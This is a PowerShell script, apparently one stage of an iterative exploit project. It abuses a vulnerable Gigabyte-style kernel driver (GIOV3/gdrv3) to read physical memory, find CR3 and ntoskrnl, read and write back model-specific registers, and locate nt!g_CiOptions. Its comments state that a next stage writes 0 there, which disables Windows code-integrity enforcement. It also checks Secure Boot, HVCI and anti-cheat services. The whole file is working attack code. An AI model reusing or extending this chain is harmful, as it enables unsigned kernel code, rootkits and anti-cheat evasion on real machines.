# ============================================================================
# p38_read.ps1 - CR3 discovery with the randomised self-map index (READ ONLY).
#
# p37 verdict: the RAM read is solid (27.7 GB host scan + a 376,832-page VM
# scan, both with proven-good reads) and the 0x1ED-only self-map predicate found
# NOTHING - the PML4 self-reference index is boot-randomised on this build.
# Writes stayed unproven (0x2014/0x2019 err=1450, 0x2800/0x2808 err=1, MSR
# 0x2580 err=65535), but that is p38b's problem, not this run's.
#
# This run is the read side ONLY.  Nothing below writes a byte, so it is safe on
# the live host and needs no reboot.  p37's S5-S7 write matrix is left out.
#
#   S1  whole-RAM scan: every 4 KiB page, ALL 512 self-ref entries, kernel half
#       populated, then ownership proved by walking a page of OURS carrying tag
#       0xAB.  KUSER_SHARED_DATA identity is logged as a second opinion.
#   rot fresh handle + canary read of live kernel code (the scan poisons it)
#   S2  MSR 0x2580 reads (LSTAR/GSBASE) + same-value write-back
#   S3  ntoskrnl: LSTAR walk, else kernel-window page-table walk
#   S4  nt!g_CiOptions via self-consistent `C7 05 imm32` sites -> targetPa
#
# Exit criteria: cr3=..., ntVa/ntPa=..., ciVa/ciPa=..., g_CiOptions value.
# Fire via p38_task.ps1 (SYSTEM).  BADPA-seeded from p37_badpa.txt.
# ============================================================================
$ErrorActionPreference = 'Continue'
$OUT = Join-Path $PSScriptRoot 'p38_read.txt'
$CS  = Join-Path $PSScriptRoot 'p38_prov.cs'

$script:L = New-Object System.Collections.ArrayList
function OpenLog {
    if ($script:logSw -ne $null) { return }
    $fs = New-Object System.IO.FileStream($OUT, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
    $script:logSw = New-Object System.IO.StreamWriter($fs, (New-Object System.Text.UTF8Encoding($false)))
    $script:logSw.AutoFlush = $true
}
function Log([string]$s) {
    $script:L.Add($s) | Out-Null
    try { OpenLog; $script:logSw.WriteLine($s) } catch { Add-Content -LiteralPath $OUT -Value $s -Encoding UTF8 }
    Write-Host $s
}

$mtx = New-Object System.Threading.Mutex($false, 'Global\QwenKern_p38')
if (-not $mtx.WaitOne(0)) { Write-Host 'p38 already running'; exit 0 }

$prevOut = Join-Path $PSScriptRoot 'p38_read_prev.txt'
if (Test-Path -LiteralPath $OUT) { Copy-Item -LiteralPath $OUT -Destination $prevOut -Force -EA 0 }
Set-Content -LiteralPath $OUT -Value ("=== p38 READ DISCOVERY (all-index PML4 scan) {0} ===" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
$adm = [bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
Log ("  admin={0}  pid={1}  host={2}" -f $adm, $PID, $env:COMPUTERNAME)
if (-not $adm) { Log '  !! NOT ELEVATED - device DACL will deny; re-run via p38_task.ps1' }

# ---- environment (registry + sc only, no WMI on the critical path) ---------
function Br([string]$s) { Log ('  ... ' + $s) }
Br 'env: registry baseline'
$osCap = ''; $osBld = ''; $cpuName = ''
try {
    $k = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -EA 0
    $osCap = [string]$k.ProductName
    $osBld = ('{0}.{1}' -f $k.CurrentBuild, $k.UBR)
    $cpuName = [string](Get-ItemProperty 'HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0' -EA 0).ProcessorNameString
} catch { $osCap = 'regread-failed: ' + $_.Exception.Message }
Log ("  os={0} build={1}  cpu={2}" -f $osCap, $osBld, $cpuName)
Br 'env: SecureBoot / testsigning / HVCI'
try { $sbv = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State' -EA 0).UEFISecureBootEnabled } catch { $sbv = 'EXC' }
try { $tsg = ((& bcdedit.exe /enum '{current}' 2>&1 | Select-String 'testsigning') -join ' ; ') } catch { $tsg = 'EXC' }
try {
    $dgr = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -EA 0
    $hvci = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity' -EA 0).Enabled
    Log ("  SecureBoot={0}  bcdedit=[{1}]  DeviceGuard VBS={2} HVCI={3}" -f $sbv, $tsg, $dgr.EnableVirtualizationBasedSecurity, $hvci)
} catch { Log ("  SecureBoot={0}  bcdedit=[{1}]" -f $sbv, $tsg) }
Br 'env: driver services (sc.exe)'
foreach ($s in 'gdrv3','MsIo','apexdrv','eaanticheat','EAAntiCheatService') {
    try { $r = ((& sc.exe query $s 2>&1) -join ' ') } catch { $r = '' }
    if ($r -match 'SERVICE_NAME') { Log ("  svc {0,-20} {1}" -f $s, (($r -replace '\s+',' ') -replace '.*STATE\s*:\s*','STATE ')) } else { Log ("  svc {0,-20} ABSENT" -f $s) }
}
Br 'env: done'

# ---- load the C# helper ----------------------------------------------------
try {
    Add-Type -Path $CS -ErrorAction Stop
    Log '  [cs] p38_prov.cs compiled'
} catch {
    Log ("  [cs] COMPILE FAILED: {0}" -f $_.Exception.Message)
    '-- p38 ABORT (compile) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
    exit 1
}

# ---- crash-learned bad-PA blacklist ----------------------------------------
# Seed from p36's file (its lessons still hold) and keep learning: a run that
# dies inside gdrv3 leaves its last PA in p38_io.txt; blacklist the enclosing
# 2 MiB so the next run walks past it instead of dying there again.
$badPath = Join-Path $PSScriptRoot 'p38_badpa.txt'
$seedPath = Join-Path $PSScriptRoot 'p37_badpa.txt'
$prevIo  = Join-Path $PSScriptRoot 'p38_io_prev.txt'
$bad = New-Object System.Collections.ArrayList
foreach ($bsrc in @($seedPath, $badPath)) {
    if (Test-Path -LiteralPath $bsrc) {
        foreach ($ln in @(Get-Content -LiteralPath $bsrc -EA 0)) {
            if ($ln -match '^\s*[0-9a-f]+\s*-\s*[0-9a-f]+\s*$') { $t = $ln.Trim(); if (-not $bad.Contains($t)) { $bad.Add($t) | Out-Null } }
        }
    }
}
$learned = ''
$ioPath = Join-Path $PSScriptRoot 'p38_io.txt'
if (Test-Path -LiteralPath $ioPath) { Copy-Item -LiteralPath $ioPath -Destination $prevIo -Force -EA 0 }
if ((Test-Path -LiteralPath $prevIo) -and (Test-Path -LiteralPath $prevOut)) {
    $prevLog = (Get-Content -LiteralPath $prevOut -EA 0) -join "`n"
    if ($prevLog -notmatch '-- p38 (END|ABORT)') {
        $lines = @(Get-Content -LiteralPath $prevIo -EA 0)
        for ($i = $lines.Count - 1; $i -ge 0; $i--) {
            if ($lines[$i] -match 'read pa=0x([0-9a-f]+) size=0x([0-9a-f]+)') {
                $kpa = [Convert]::ToUInt64($matches[1], 16)
                # The fault is one driver instruction on a bad backing PFN, and the
                # observed clusters span >=32 MB (low RAM lost all 16 blocks at
                # once), so blacklist a +-16 MB window instead of the single block:
                # one reboot then buys 32 MB of walk instead of 2 MB.
                $kb = (([uint64]$kpa) -shr 21) -shl 21
                $ks = $kb; if ($ks -gt 0x1000000) { $ks = $kb - 0x1000000 } else { $ks = 0x1000 }
                $learned = ('{0:x}-{1:x}' -f $ks, ($kb + 0x1200000))
                break
            }
        }
    }
}
if ($learned -ne '') {
    $ls = [Convert]::ToUInt64(($learned.Split('-'))[0], 16)
    $le = [Convert]::ToUInt64(($learned.Split('-'))[1], 16)
    if ($le -le $ls) { Log ('  !! BADPA: window {0} is degenerate (start >= end)' -f $learned) }
    elseif (-not $bad.Contains($learned)) {
        $bad.Add($learned) | Out-Null
        Log ("  BADPA: previous run died, blacklisting a window around it: {0}" -f $learned)
    } else { Log ("  BADPA: {0} is already covered, no new window" -f $learned) }
}
if ($bad.Count -gt 0) { Log ("  BADPA: {0} range(s) offered (p36 seed + p38 learned)" -f $bad.Count) }
[P38Prov]::SetBadRanges(($bad -join ','))
# The C# parser is the authority now: it repairs inverted pairs and sorts, so read
# the count back instead of trusting the file.  A silently-dropped range used to
# cost a whole boot per typo.
if ([P38Prov]::BadRejected -gt 0) { Log ("  !! BADPA: {0} range(s) rejected (unparsable/degenerate)" -f [P38Prov]::BadRejected) }
if ([P38Prov]::BadRepaired -gt 0) { Log ("  BADPA: {0} inverted range(s) repaired (dropped-digit shift)" -f [P38Prov]::BadRepaired) }
if ([P38Prov]::BadStarts.Length -eq 0) { Log '  !! BADPA: blacklist EMPTY - the walk will re-enter every crash hole' }
else { Log ("  BADPA: {0} range(s) active, {1} MB blacklisted" -f [P38Prov]::BadStarts.Length, [math]::Round(([P38Prov]::BlacklistedBytes())/1MB)) }
# rewrite canonical: sorted, inverted pairs repaired, one range per line
try {
    $norm = for ($bi = 0; $bi -lt [P38Prov]::BadStarts.Length; $bi++) { '{0:x}-{1:x}' -f [P38Prov]::BadStarts[$bi], [P38Prov]::BadEnds[$bi] }
    $bl = ((@($norm) -join "`r`n") + "`r`n")
    $bb = [System.Text.Encoding]::UTF8.GetBytes($bl)
    $bfs = New-Object System.IO.FileStream($badPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
    try { $bfs.Write($bb, 0, $bb.Length); $bfs.Flush($true) } finally { $bfs.Dispose() }
} catch { Log ('  !! BADPA save failed: ' + $_.Exception.Message) }
[P38Prov]::SetBadRanges(($bad -join ','))

$ramTop = [uint64]0
try { $ramTop = [uint64](Get-CimInstance Win32_ComputerSystem -EA Stop).TotalPhysicalMemory } catch { $ramTop = [uint64]0 }
if ($ramTop -eq 0) { $ramTop = [uint64]0x800000000; Log '  !! physical memory unknown (P38Prov has no RamTop) - assuming 32 GB' }
Log ("  ramTop=0x{0:x} ({1} GB)" -f $ramTop, [math]::Round($ramTop/1GB,1))
$ramRanges = ''
try { $ramRanges = [P38Prov]::RamRangesFromRegistry() } catch { $ramRanges = 'native-exc: ' + $_.Exception.Message }
Log ("  ramRanges = {0}" -f $ramRanges)
if ($ramRanges -match '^(open|query|read|short|no-memory|native-exc)') { $ramRanges = '' }
if ($ramRanges -eq '') { Log '  !! RAM map EMPTY - fallback pa<ramTop + BADPA (hole PAs can still bugcheck)' }
[P38Prov]::SetRamRanges($ramRanges, $ramTop)

# per-IOCTL breadcrumb: must survive a bugcheck, so WriteThrough + flush.
Set-Content -LiteralPath $ioPath -Value ("# io breadcrumb {0}" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
$ioFs = New-Object System.IO.FileStream($ioPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
$script:ioFs = $ioFs
$script:ioSw = New-Object System.IO.StreamWriter($ioFs, (New-Object System.Text.UTF8Encoding($false)))
$script:ioSw.AutoFlush = $true
# every record is forced past the file cache before the IOCTL that may kill us
try { [P38Prov]::Notify = [P38Prov+Note] { param([string]$s) try { $script:ioSw.WriteLine($s); $script:ioSw.Flush(); $script:ioFs.Flush($true) } catch { } } }
catch { Log ('  !! Notify hook failed: ' + $_.Exception.Message) }

$verdict = @{ cr3 = $false; nt = $false; ci = $false; write = $false; msr = $false; mapk = $false; alloc = $false }
$cr3 = [uint64]0; $ntPa = [uint64]0; $ntVa = [uint64]0; $ntSize = [uint32]0
$ciVa = [uint64]0; $ciPa = [uint64]0

# ---- G0: open the only verified device ------------------------------------
$g = [IntPtr]::Zero
$eo = [P38Prov]::GdrvOpen([ref]$g)
if ($eo -ne '') {
    Log ("  G0 \\.\GIOV3 FAIL {0}" -f $eo)
    Log '  [cs] (device unavailable - aborting)'
    '-- p38 ABORT (no device) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
    exit 1
}
Log ("  G0 \\.\GIOV3 open handle=0x{0:x}" -f $g.ToInt64())
try { (Get-Process -Id $PID).ProcessorAffinity = [IntPtr]1; Log '  cpu affinity = CPU0' } catch { Log ('  affinity failed: ' + $_.Exception.Message) }
Log ("  G0 read phys 0x1000 = {0}" -f ([P38Prov]::Hex([P38Prov]::GdrvProbe($g, [uint64]0x1000, 32))))
Log ("  G0 read phys 0x100000 = {0}" -f ([P38Prov]::Hex([P38Prov]::GdrvProbe($g, [uint64]0x100000, 16))))
Log ("  stage va=0x{0:x} locked={1} lastErr={2} issued={3} h1450={4}" -f [P38Prov]::StageVa, [P38Prov]::StageLocked, [P38Prov]::LastErr, [P38Prov]::Issued, [P38Prov]::Last1450)

# ---- pages for the write matrix (src is needed by the CR3 scan already) ---
# Fixed low VAs so q0 stays a plausible *PA* in the swapped roles and q3 stays
# a plausible *user VA*.  src carries tag 0xAB at +0x800: a PML4 candidate is
# only accepted as CR3 if it translates src and that tag comes back.
function AllocAt([uint64[]]$bases) {
    foreach ($b in $bases) {
        $p = [P38Prov]::PageAlloc($b)
        if ($p -ne [IntPtr]::Zero) { return $p }
    }
    return [IntPtr]::Zero
}
$srcPtr = [IntPtr]::Zero; $ctlPtr = [IntPtr]::Zero; $kvaPtr = [IntPtr]::Zero
$srcVa = [uint64]0
$srcPtr = AllocAt ([uint64[]]@(0x10000000L, 0x08000000L, 0x04000000L))
if ($srcPtr -ne [IntPtr]::Zero) {
    $srcVa = [uint64]$srcPtr.ToInt64()
    [P38Prov]::MemZero($srcPtr, 0x1000)
    [System.Runtime.InteropServices.Marshal]::WriteByte($srcPtr, 0x800, 0xAB)
    Log ("  src page 0x{0:x} (pattern carrier + CR3 tag validator)" -f $srcVa)
} else { Log '  !! src page alloc FAIL - CR3 scan cannot validate owner' }

# ---- S1: chunk ladder + all-512-entry PML4 self-map scan -> CR3 -----------
Log ''
Log '########## S1 whole-RAM PML4 self-map scan, ALL 512 entries (read-only) ##########'
$probes = [uint64[]]@([uint64]0x100000, [uint64]0x100000000)
$crep = ''
$chunk = [P38Prov]::ChunkSize($g, $probes, [ref]$crep)
foreach ($ln in ($crep -split "`r`n")) { if ($ln -ne '') { Log ("  ladder{0}" -f $ln) } }
# 0x10000 is the only size proven crash-clean (624 MB scanned at it). The ladder
# above stays purely diagnostic; its verdict is deliberately overridden.
if ($chunk -eq 0) { Log '  ladder: no size passed - using the proven 0x10000' }
elseif ($chunk -ne 0x10000) { Log ("  ladder: measured best 0x{0:x}, clamped to the proven 0x10000" -f $chunk) }
$chunk = 0x10000
Log ("  chunk = 0x{0:x}" -f $chunk)
$pnotes = ''; $scanned = [uint64]0; $selfIdx = -1
$t0 = Get-Date
if ($srcVa -ne 0) {
    try { $pn = [P38Prov]::ScanPml4All($g, $ramTop, $chunk, $srcVa, [byte]0xAB, [ref]$cr3, [ref]$pnotes, [ref]$scanned, [ref]$selfIdx) }
    catch { $pn = ''; $cr3 = [uint64]0; Log ('  S1 EXCEPTION: ' + $_.Exception.Message) }
} else { $pn = ''; Log '  S1 skipped scan (no src page to prove ownership)' }
foreach ($ln in ($pnotes -split "`r`n")) { if ($ln -ne '') { Log $ln } }
Log ("  S1 scanned=0x{0:x} accepted={1} cr3=0x{2:x} selfIdx=0x{3:x} unread_pages={4} split_recovered={5} in {6:N1}s" -f $scanned, $pn, $cr3, $selfIdx, [P38Prov]::UnreadPages, [P38Prov]::SplitRecovered, ((Get-Date) - $t0).TotalSeconds)
if ($cr3 -ne 0) {
    $verdict.cr3 = $true
    $chk = [P38Prov]::RdQ($g, $cr3 + [uint64]$selfIdx * 8)
    $selfOk = (($chk -band 0x000FFFFFFFFFF000L) -eq $cr3)
    Log ("  S1 self-entry = 0x{0:x} self-consistent={1} - CR3 VALID (index 0x{2:x})" -f $chk, $selfOk, $selfIdx)
} else {
    Log '  S1 no CR3  FAIL'
    Log '  hint: if reads were clean, the bench (VM-B) is the place to iterate the predicate'
}

# ---- rotation: fresh handle + liveness canary ----------------------------
# The scan above issues thousands of IOCTLs; the driver degrades (1450) and can
# AV on a poisoned handle.  Drop it, take a fresh one, and never write blind:
# every write below is preceded by a canary read of live kernel code.
function Heal([string]$why) {
    Log ("  [heal] " + $why + " -> reopening GIOV3")
    try { [P38Prov]::CloseHandle2($script:g) | Out-Null } catch { }
    $script:g = [IntPtr]::Zero
    $he = [P38Prov]::GdrvOpen([ref]$script:g)
    $script:g = $script:g
    if ($he -ne '') { Log ("  [heal] reopen FAIL " + $he); return $false }
    Log ("  [heal] reopened handle=0x{0:x}" -f $script:g.ToInt64())
    return $true
}
function Canary {
    $c = [P38Prov]::GdrvReadStrict($script:g, [uint64]0x1000, 0x10)
    if ($c -ne $null -and $c[0] -eq 0xE9) { return $true }
    Log ("  [heal] canary dead (lastErr={0})" -f [P38Prov]::LastErr)
    if (-not (Heal 'canary')) { return $false }
    $c = [P38Prov]::GdrvReadStrict($script:g, [uint64]0x1000, 0x10)
    if ($c -ne $null -and $c[0] -eq 0xE9) { return $true }
    Log '  [heal] canary still dead after reopen'
    return $false
}
Log ''
Log '########## H handle rotation + canary before any write ##########'
try { [P38Prov]::CloseHandle2($g) | Out-Null } catch { }
$g = [IntPtr]::Zero
$hr = [P38Prov]::GdrvOpen([ref]$g)
Log ("  H reopen: {0} handle=0x{1:x}" -f $(if ($hr -eq '') { 'ok' } else { $hr }), $g.ToInt64())
$script:g = $g
$alive = Canary
Log ("  H canary phys 0x1000: {0}  stage=0x{1:x}  issued_so_far={2}" -f $(if ($alive) { 'live' } else { 'DEAD' }), [P38Prov]::StageVa, [P38Prov]::Issued)
# ---- S2: MSR reads (0x2580) ----------------------------------------------
Log ''
Log '########## S2 MSR reads via 0xC3502580 ##########'
$lstar = [uint64]0; $gsbase = [uint64]0
foreach ($msr in [uint32]0xC0000082, [uint32]0xC0000101, [uint32]0x10, [uint32]0xC0000081, [uint32]0xC0000102) {
    $mq0 = [uint64]0; $mq1 = [uint64]0; $mih = ''; $moh = ''; $mg = [uint32]0; $me = [uint32]0
    try { $mok = [P38Prov]::IoMsrRead($g, $msr, [ref]$mq0, [ref]$mq1, [ref]$mih, [ref]$moh, [ref]$mg, [ref]$me) }
    catch { $mok = $false; $me = 0xFFFF; Log ('  MSR EXCEPTION: ' + $_.Exception.Message) }
    Log ("  msr 0x{0:x8}: ok={1} err={2} info={3} q0=0x{4:x} q1=0x{5:x}" -f $msr, $mok, $me, $mg, $mq0, $mq1)
    Log ("    in ={0}" -f $mih)
    Log ("    out={0}" -f $moh)
    if ($mok -and ($mq0 -ne 0 -or $mq1 -ne 0)) {
        $verdict.msr = $true
        if ($msr -eq [uint32]0xC0000082) { $lstar = $mq0 }
        if ($msr -eq [uint32]0xC0000101) { $gsbase = $mq0 }
    }
}
Log ("  LSTAR=0x{0:x}  GSBASE=0x{1:x}" -f $lstar, $gsbase)
if ($lstar -ge 0xFFFFF80000000000L) {
    # same-value write-back: proves the 0x2584 path without changing anything
    try { $wok = [P38Prov]::IoMsrWrite($g, [uint32]0xC0000082, $lstar, [ref]$mg, [ref]$me) }
    catch { $wok = $false; $me = 0xFFFF }
    Log ("  MSR write-back LSTAR: ok={0} err={1} info={2} (written value = value just read)" -f $wok, $me, $mg)
}

# ---- S3: ntoskrnl VA -----------------------------------------------------
Log ''
Log '########## S3 ntoskrnl locate ##########'
if ($verdict.cr3 -and $lstar -ge 0xFFFFF80000000000L) {
    $nh = ''
    try { $nn = [P38Prov]::NtFromLstar($g, $cr3, $lstar, [ref]$ntVa, [ref]$ntSize, [ref]$nh) }
    catch { $nn = ''; Log ('  S3a EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($nh -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S3a from LSTAR result={0} va=0x{1:x}" -f $nn, $ntVa)
}
if ($ntVa -eq 0 -and $verdict.cr3) {
    Log '  S3b falling back to kernel-window page-table walk'
    $wh = ''
    try { $wn = [P38Prov]::ScanNtWin($g, $cr3, [ref]$ntVa, [ref]$ntSize, [ref]$wh) }
    catch { $wn = ''; Log ('  S3b EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($wh -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S3b window walk result={0} va=0x{1:x}" -f $wn, $ntVa)
}
if ($ntVa -ne 0) {
    $wok2 = [P38Prov]::Walk($g, $cr3, $ntVa, [ref]$ntPa)
    Log ("  S3 ntoskrnl va=0x{0:x} pa=0x{1:x} sizeOfImage=0x{2:x} walk={3}" -f $ntVa, $ntPa, $ntSize, $wok2)
    if ($wok2 -and $ntPa -ne 0) { $verdict.nt = $true; Log '  S3 PASS' } else { Log '  S3 walk-back FAIL' }
} else { Log '  S3 no ntoskrnl  FAIL' }

# ---- S4: nt!g_CiOptions --------------------------------------------------
Log ''
Log '########## S4 nt!g_CiOptions (C7 05 self-consistent sites) ##########'
if ($verdict.nt) {
    $crep2 = ''
    try { $cn = [P38Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPa, $ntSize, [ref]$crep2) }
    catch { $cn = '0'; Log ('  S4 EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($crep2 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S4 pattern hits = {0}" -f $cn)
    $ms = [regex]::Match($crep2, 'targetVa=0x([0-9a-f]+) targetPa=0x([0-9a-f]+) current=0x([0-9a-f]+)\s+<==')
    if ($ms.Success) {
        $ciVa = [uint64]::Parse($ms.Groups[1].Value, 'HexNumber')
        $ciPa = [uint64]::Parse($ms.Groups[2].Value, 'HexNumber')
        $civ = [uint32]::Parse($ms.Groups[3].Value, 'HexNumber')
        $verdict.ci = $true
        Log ("  S4 g_CiOptions targetVa=0x{0:x} targetPa=0x{1:x} current=0x{2:x2} -> p38c writes 0 here" -f $ciVa, $ciPa, $civ)
    } else { Log '  S4 no self-consistent hit' }
} else { Log '  S4 skipped (no ntoskrnl)' }

# ---- verdict summary -----------------------------------------------------
Log ''
Log '########## VERDICT ##########'
Log ("  cr3={0} nt={1} ci={2}" -f $verdict.cr3, $verdict.nt, $verdict.ci)
if ($verdict.ci) { Log ("  NEXT p38b: write-probe; only 0 goes to targetPa=0x{0:x} (current 0x{1:x8}) in p38c" -f $ciPa, $civ) }
'-- p38 END (read) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
try { [P38Prov]::CloseHandle2($g) | Out-Null } catch { }